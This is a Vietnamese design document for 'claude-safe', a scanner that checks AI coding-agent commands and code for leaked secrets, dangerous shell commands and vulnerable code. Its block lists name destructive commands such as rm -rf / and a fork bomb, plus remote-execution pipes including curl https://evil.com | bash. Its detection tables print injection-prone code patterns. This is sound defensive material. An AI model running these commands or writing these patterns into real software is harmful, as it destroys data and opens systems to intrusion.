# claude-safe — Tiêu chí đánh giá Risk & Tác dụng chính

> Document này mô tả chính xác cách `claude-safe` đánh giá rủi ro và hoạt động,
> dựa trực tiếp trên source code thực tế (không phải tài liệu marketing).

---

## Tổng quan: 3 lớp bảo vệ

```
Input (command / file content / code)
          │
          ▼
┌─────────────────────────────────┐
│  Lớp 1: Secret Detection        │  Phát hiện credentials bị lộ
│  Lớp 2: Command Validator       │  Phát hiện lệnh shell nguy hiểm
│  Lớp 3: Code Vulnerability Scan │  Phát hiện lỗ hổng bảo mật trong code
└─────────────────────────────────┘
          │
          ▼
     Risk Score Engine
     (tổng hợp → 0–100)
          │
          ▼
     Policy Engine
     (so sánh với max_risk_level → Allow / Block)
```

---

# LỚP 1 — Secret Detection

**Mục đích:** Phát hiện thông tin xác thực (credentials) bị hardcode hoặc vô tình đưa vào code/lệnh.

## Danh sách đầy đủ các pattern được detect

| # | Loại secret | Pattern nhận dạng | Severity | Score |
|---|---|---|---|---|
| 1 | **AWS Access Key** | Bắt đầu bằng `AKIA`, `ABIA`, `ACCA`, `ASIA` + 16 ký tự | CRITICAL | +40 |
| 2 | **AWS Secret Key** | `aws...secret...` + chuỗi 40 ký tự trong quotes | CRITICAL | +40 |
| 3 | **GitHub Token** | `gho_`, `ghu_`, `ghs_`, `ghr_` + 36–255 ký tự | CRITICAL | +40 |
| 4 | **GitHub Classic Token** | `ghp_` + 36 ký tự | CRITICAL | +40 |
| 5 | **OpenAI API Key** | `sk-...T3BlbkFJ...` (format cũ) | CRITICAL | +40 |
| 6 | **OpenAI API Key** | `sk-proj-` + 50+ ký tự (format mới) | CRITICAL | +40 |
| 7 | **RSA/EC/DSA Private Key** | `-----BEGIN ... PRIVATE KEY-----` | CRITICAL | +40 |
| 8 | **Database Connection String** | `postgres://`, `mysql://`, `mongodb://`, `redis://` + credentials | CRITICAL | +40 |
| 9 | **Stripe Secret Key** | `sk_live_` + 24+ ký tự | CRITICAL | +40 |
| 10 | **JWT Token** | `eyJ...` (3 phần base64 phân tách bởi `.`) | HIGH | +25 |
| 11 | **Generic Password** | `password =`, `passwd:`, `pwd =` + giá trị 8+ ký tự trong quotes | HIGH | +25 |
| 12 | **Generic Secret** | `secret =`, `api_key =`, `access_token =` + giá trị trong quotes | HIGH | +25 |
| 13 | **Slack Token** | `xoxb-`, `xoxa-`, `xoxp-`, `xoxr-`, `xoxs-` + 10–48 ký tự | HIGH | +25 |
| 14 | **Google API Key** | `AIza` + 35 ký tự | HIGH | +25 |
| 15 | **Hardcoded IP + credentials** | `admin:password@192.168.x.x` | MEDIUM | +15 |

### Cơ chế bảo vệ kép sau khi detect:
1. **Redact trước khi log** — match bị che giữa: `AKIA****MPLE` (4 đầu + 4 cuối, giữa che `*`)
2. **Tự động block** — nếu Severity là CRITICAL hoặc HIGH → `ShouldBlock = true`

---

# LỚP 2 — Command Validator

**Mục đích:** Chặn các lệnh shell có khả năng gây hại cho hệ thống.

## Quy tắc CRITICAL (luôn block)

| Lệnh | Lý do |
|---|---|
| `rm -rf /` | Xóa toàn bộ root filesystem |
| `rm -rf ~` | Xóa toàn bộ home directory |
| `rm -rf *` | Xóa đệ quy với wildcard |
| `mkfs` | Format filesystem — mất toàn bộ data |
| `dd if=` | Ghi đĩa cấp thấp — có thể phá hủy data |
| `:(){ :|:& };:` | Fork bomb — crash hệ thống |
| `curl \| bash` | Remote code execution qua pipe |
| `curl \| sh` | Remote code execution qua pipe |
| `wget \| bash` | Remote code execution qua pipe |
| `wget \| sh` | Remote code execution qua pipe |
| `curl ... \| python` | Remote code execution qua pipe |
| `python -c` | Inline Python execution |
| `eval $(` | Dynamic code evaluation — injection risk |
| `sudo su` | Escalate lên root shell hoàn toàn |
| `sudo -i` | Root interactive shell |
| `chmod 777 /` | World-writable permissions trên root |
| `iptables -F` | Xóa toàn bộ firewall rules |
| `shutdown` | Tắt máy |
| `reboot` | Khởi động lại máy |
| `halt` | Dừng hệ thống |

## Quy tắc HIGH (block theo policy)

| Lệnh | Lý do |
|---|---|
| `rm -rf` (generic) | Xóa đệ quy force |
| `chmod 777` | World-writable permissions |
| `kill -9` | Force kill process — có thể gây mất data |
| `killall` | Kill tất cả process cùng tên |
| `pkill -9` | Force kill theo tên |
| `truncate` | Xóa nội dung file |
| `shred` | Xóa file không thể phục hồi |
| `wipe` | Wipe disk |
| `docker system prune -a` | Xóa toàn bộ Docker data |
| `git push --force` / `git push -f` | Overwrite lịch sử remote |
| `git reset --hard` | Hủy uncommitted changes |
| `DROP TABLE` | Xóa bảng SQL |
| `DROP DATABASE` | Xóa database SQL |
| `DELETE FROM` (không có WHERE) | Mass delete SQL |

## Quy tắc MEDIUM (cảnh báo, không block mặc định)

| Lệnh | Lý do |
|---|---|
| `sudo` | Yêu cầu elevated privileges |
| `chmod`, `chown` | Thay đổi quyền/ownership file |
| `curl`, `wget` | HTTP request ra ngoài |
| `pip install`, `npm install`, `apt install` | Cài package |
| `ssh`, `scp` | Remote connection |
| `nmap` | Network scan |
| `docker run --privileged` | Privileged container |
| `systemctl` | Quản lý service |
| `crontab` | Scheduled task |

---

# LỚP 3 — Code Vulnerability Scanner

**Mục đích:** Phát hiện lỗ hổng bảo mật trong code AI sinh ra (OWASP Top 10 và hơn nữa).

## Ngôn ngữ được hỗ trợ

`Go` | `Python` | `JavaScript` | `TypeScript` | `Java` | `PHP` | `Ruby`

_(Phát hiện tự động qua file extension hoặc nội dung)_

## 13 loại lỗ hổng được phát hiện

### 1. SQL Injection (`SQL_INJECTION`) — CRITICAL
Phát hiện khi query SQL được build bằng string concatenation / format thay vì parameterized query.

| Ngôn ngữ | Ví dụ bị detect |
|---|---|
| Go | `db.Query(fmt.Sprintf("SELECT * FROM users WHERE id=%d", id))` |
| Python | `cursor.execute("SELECT * WHERE id=%s" % user_id)` |
| Python | `cursor.execute(f"SELECT * WHERE id={user_id}")` |
| JavaScript | `` query(`SELECT * WHERE id=${req.params.id}`) `` |
| Java | `executeQuery("SELECT * WHERE id=" + id)` |
| PHP | `mysql_query("SELECT * WHERE id=$_GET['id']")` |
| Ruby | `.where("id = #{params[:id]}")` |

---

### 2. XSS — Cross-Site Scripting (`XSS`) — HIGH
| Ngôn ngữ | Pattern detect | Severity |
|---|---|---|
| JS/TS | `.innerHTML =`, `.outerHTML =` | HIGH |
| JS/TS | `document.write()` | HIGH |
| JS/TS | `dangerouslySetInnerHTML={{` | HIGH |
| PHP | `echo $_GET['x']` | HIGH |
| Python | `render_template_string(request.args...)` | MEDIUM |
| Ruby | `params[:x].html_safe`, `raw(params[:x])` | HIGH |

---

### 3. Command Injection (`COMMAND_INJECTION`) — CRITICAL
| Ngôn ngữ | Pattern detect |
|---|---|
| Go | `exec.Command(fmt.Sprintf(...), r.Form...)` |
| Python | `os.system(f"cmd {user_input}")` |
| Python | `subprocess.run(..., shell=True)` |
| JavaScript | `` exec(`cmd ${req.body.input}`) `` |
| PHP | `system($_GET['cmd'])` |
| Java | `Runtime.getRuntime().exec(request.getParameter(...))` |
| Ruby | `` `rm #{params[:file]}` `` |

---

### 4. SSRF — Server-Side Request Forgery (`SSRF`) — HIGH
| Ngôn ngữ | Pattern detect |
|---|---|
| Go | `http.Get(r.FormValue("url"))` |
| Python | `requests.get(request.args.get('url'))` |
| JavaScript | `` fetch(`${req.query.target}`) `` |
| Ruby | `Net::HTTP.get(URI(params[:url]))` |

---

### 5. Path Traversal (`PATH_TRAVERSAL`) — HIGH
| Ngôn ngữ | Pattern detect |
|---|---|
| Go | `os.ReadFile(r.FormValue("path"))` |
| Python | `open(request.args.get('file'))` |
| PHP | `include($_GET['page'])` |
| Ruby | `File.read("#{params[:filename]}")` |

---

### 6. Insecure Cryptography (`INSECURE_CRYPTO`) — HIGH/MEDIUM

| Pattern | Severity | Lý do |
|---|---|---|
| `md5(password)`, `sha1(password)` | HIGH | Quá yếu để hash password |
| `hashlib.md5()`, `hashlib.sha1()` | MEDIUM | MD5/SHA1 bị broken |
| `crypto.createHash('md5')` | MEDIUM | MD5 bị broken |
| `AES/ECB mode` | HIGH | ECB không ẩn được pattern |
| `Digest::MD5.hexdigest` (Ruby) | MEDIUM/HIGH | MD5/SHA1 yếu |

---

### 7. Insecure JWT (`INSECURE_JWT`) — CRITICAL/HIGH

| Pattern | Severity |
|---|---|
| `algorithms=['none']` — bỏ verify signature | CRITICAL |
| `algorithm: 'none'` | CRITICAL |
| `verify_signature: False` | CRITICAL |
| JWT sign/verify với hardcoded secret string | HIGH |

---

### 8. Unsafe Deserialization (`UNSAFE_DESERIALIZATION`) — CRITICAL

| Pattern | Ngôn ngữ | Severity |
|---|---|---|
| `pickle.loads()`, `pickle.load()` | Python | CRITICAL |
| `yaml.load()` (không có Loader=) | Python | HIGH |
| `ObjectInputStream(request...)` | Java | CRITICAL |
| `unserialize($_GET['data'])` | PHP | CRITICAL |
| `Marshal.load()` | Ruby | CRITICAL |
| `YAML.load(params...)` | Ruby | HIGH |

---

### 9. Eval Injection (`EVAL_INJECTION`) — CRITICAL

| Pattern | Ngôn ngữ |
|---|---|
| `eval(request.args.get('code'))` | Python |
| `eval(req.body.code)` | JavaScript |
| `eval($_POST['code'])` | PHP |
| `eval(params[:code])` | Ruby |

---

### 10. Debug Mode Enabled (`DEBUG_ENABLED`) — MEDIUM/LOW

| Pattern | Ngôn ngữ | Severity |
|---|---|---|
| `DEBUG = True` | Python/Django | MEDIUM |
| `NODE_ENV = 'development'` | JavaScript | LOW |
| `console.log(...password...)` | JavaScript | LOW |
| `puts password` / `logger.debug token` | Ruby | MEDIUM |

---

### 11. Insecure Random (`INSECURE_RANDOM`) — MEDIUM

| Pattern | Ngôn ngữ |
|---|---|
| `random.random()` dùng cho token/session/key | Python |
| `random.randint()` dùng cho secret | Python |
| `Math.random()` | JavaScript |
| `rand()`, `Random.rand()` | Ruby |

---

### 12. XXE — XML External Entity (`XXE`) — HIGH

| Pattern | Ngôn ngữ |
|---|---|
| `DocumentBuilderFactory.newInstance()` không config | Java |
| `etree.parse()`, `lxml.etree` | Python |

---

### 13. Open Redirect (`OPEN_REDIRECT`)

_(Định nghĩa trong VulnType, đang mở rộng rules)_

---

# CÔNG THỨC TÍNH RISK SCORE

## Score từ Secret Detection (Lớp 1)

```
CRITICAL secret  → +40 điểm
HIGH secret      → +25 điểm
MEDIUM secret    → +15 điểm
LOW secret       → +5 điểm
```

## Score từ Command Validator (Lớp 2)

```
CRITICAL command → +50 điểm  + ShouldBlock = true
HIGH command     → +30 điểm  + ShouldBlock = true
MEDIUM command   → +10 điểm
LOW command      → +0 điểm   (bỏ qua)
```

## Score từ Code Vulnerability Scanner (Lớp 3)

```
CRITICAL finding → +40 điểm
HIGH finding     → +25 điểm
MEDIUM finding   → +10 điểm
LOW finding      → +3 điểm
```

## Quy đổi Score → Risk Level

```
Score = 0          → SAFE
Score 1–15         → LOW      (Lớp 1+2)
Score 1–9          → LOW      (Lớp 3)
Score 16–35        → MEDIUM   (Lớp 1+2)
Score 10–24        → MEDIUM   (Lớp 3)
Score 36–55        → HIGH     (Lớp 1+2)
Score 25–39        → HIGH     (Lớp 3)
Score > 55         → CRITICAL (Lớp 1+2)
Score ≥ 40         → CRITICAL (Lớp 3)

Tối đa: 100 (capped)
```

> **Lưu ý:** Ngoài score, `ShouldBlock` flag từ command validator có thể kích hoạt block
> ngay cả khi score chưa vượt ngưỡng.

---

# POLICY ENGINE — Điều kiện Block

Policy được load từ `.claude-safe/policy.yaml`. Block xảy ra khi **bất kỳ** điều kiện nào sau đây đúng:

```
1. ShouldBlock = true  AND  levelOrder(report.Level) >= levelOrder(max_risk_level)
   → "Risk level HIGH exceeds policy maximum medium"

2. block_secrets = true  AND  có secret findings
   → "Policy blocks secrets (N detected)"

3. block_dangerous_commands = true  AND  có command risks
   → "Policy blocks dangerous commands (N detected)"
```

## Ví dụ phán quyết với policy `max_risk_level: medium`

| Input | Score | Level | ShouldBlock | Kết quả |
|---|---|---|---|---|
| `echo hello` | 0 | SAFE | false | ✅ ALLOW |
| `npm install` | 10 | MEDIUM | false | ✅ ALLOW (MEDIUM = max, không block) |
| `chmod 777 /tmp` | 30 | MEDIUM | true | ❌ BLOCK |
| `rm -rf /build` | 30 | MEDIUM | true | ❌ BLOCK |
| `curl https://evil.com \| bash` | 50 | HIGH | true | ❌ BLOCK |
| `AWS_KEY=AKIA...` trong file | 40 | HIGH | true | ❌ BLOCK |
| `pickle.loads(user_data)` | 40 | CRITICAL | false | ❌ BLOCK (score ≥ threshold) |

---

# TÁC DỤNG CHÍNH CỦA CLAUDE-SAFE

## 1. Ngăn chặn Secrets Leak (Lớp 1)
- **Vấn đề:** AI có thể đề xuất hardcode API key, database password vào code
- **Giải pháp:** Scan mọi content trước khi ghi file — nếu có secret thì block
- **Ví dụ thực tế:** AI gợi ý `DATABASE_URL = "postgres://admin:secret@prod.db:5432/app"` → bị chặn ngay

## 2. Ngăn chặn Destructive Commands (Lớp 2)
- **Vấn đề:** AI có thể chạy lệnh phá hủy hệ thống nếu context không đúng
- **Giải pháp:** Validate tất cả Bash command trước khi execute
- **Ví dụ thực tế:** AI chạy `rm -rf ./dist && rm -rf /` do typo → bị chặn

## 3. Ngăn chặn Vulnerable Code (Lớp 3)
- **Vấn đề:** AI-generated code thường có SQL injection, XSS, hardcoded secrets
- **Giải pháp:** Scan code trước khi ghi — cảnh báo hoặc block theo severity
- **Ví dụ thực tế:** AI sinh `db.query(\`SELECT * WHERE id=${req.params.id}\`)` → bị chặn (SQL injection)

## 4. Audit Trail (Claude Code Hooks)
- **Vấn đề:** Không có cách nào biết AI đã làm gì trong session
- **Giải pháp:** Log tất cả scan events (input, risk_level, blocked/allowed, reason) ra file local
- **Ví dụ thực tế:** `.claude-safe/audit.log` chứa toàn bộ lịch sử hoạt động AI

## 5. Policy Enforcement (Governance)
- **Vấn đề:** Mỗi developer có risk tolerance khác nhau, không có chuẩn chung
- **Giải pháp:** Policy YAML định nghĩa ngưỡng rủi ro được phép — áp dụng nhất quán
- **Ví dụ thực tế:** Team prod dùng `max_risk_level: low`, team dev dùng `max_risk_level: high`

## 6. Realtime IDE Protection (VSCode Extension)
- **Vấn đề:** Developer không biết code đang soạn có lỗ hổng không
- **Giải pháp:** Scan mỗi khi save file → hiển thị underline + Problems panel ngay lập tức
- **Ví dụ thực tế:** Gõ `eval(user_input)` → underline đỏ xuất hiện ngay khi Ctrl+S

## 7. Enterprise Visibility (Dashboard)
- **Vấn đề:** Security team không thấy được AI đang làm gì trong toàn tổ chức
- **Giải pháp:** CLI gửi events lên Dashboard → thống kê, charts, alerts theo thời gian thực
- **Ví dụ thực tế:** Manager thấy dev3 bị block 15 lần hôm nay → investigate

## 8. Pre-commit Protection (Git Integration)
- **Vấn đề:** Secret có thể vào codebase qua git commit
- **Giải pháp:** Pre-commit hook scan staged changes — block nếu có secret
- **Ví dụ thực tế:** `git commit` bị từ chối vì có AWS key trong `.env` vô tình được staged

## 9. Webhook Alerting (Phase 5)
- **Vấn đề:** Security team không được thông báo kịp thời khi có incident
- **Giải pháp:** Khi event bị block → tự động POST tới webhook URL (Slack, PagerDuty, etc.)
- **Ví dụ thực tế:** Slack channel #security nhận alert ngay khi có `curl|bash` bị block

---

## Tóm lại: Luồng phán quyết hoàn chỉnh

```
Command/File/Code
        │
        ├─[Lớp 1]─ Secret scan ──────────────────── CRITICAL/HIGH → ShouldBlock = true
        │                                             + Score += 40/25/15/5
        │
        ├─[Lớp 2]─ Command validate ─────────────── CRITICAL/HIGH → ShouldBlock = true
        │                                             + Score += 50/30/10
        │
        └─[Lớp 3]─ Code vuln scan ───────────────── CRITICAL/HIGH/MEDIUM/LOW
                    (SQL, XSS, CMDi, SSRF,            + Score += 40/25/10/3
                     PathTraversal, Crypto,
                     JWT, Deserialize, Eval,
                     Debug, Random, XXE)
                              │
                              ▼
                    Total Score (0–100, capped)
                              │
                              ▼
                    Risk Level: SAFE/LOW/MEDIUM/HIGH/CRITICAL
                              │
                              ▼
                    Policy Check:
                    ├── ShouldBlock AND Level >= max_risk_level? → BLOCK
                    ├── block_secrets AND secrets found?         → BLOCK
                    └── block_commands AND commands found?       → BLOCK
                              │
                    ┌─────────┴──────────┐
                    │                    │
                  ALLOW               BLOCK (exit 2)
                    │                    │
               Log event           Log event
               Send to             Send to
               Dashboard           Dashboard
                                   Fire Webhooks
```

---

*Tài liệu này được sinh từ source code thực tế tại `claude-safe/internal/`*
*Last updated: 2026-05-19*
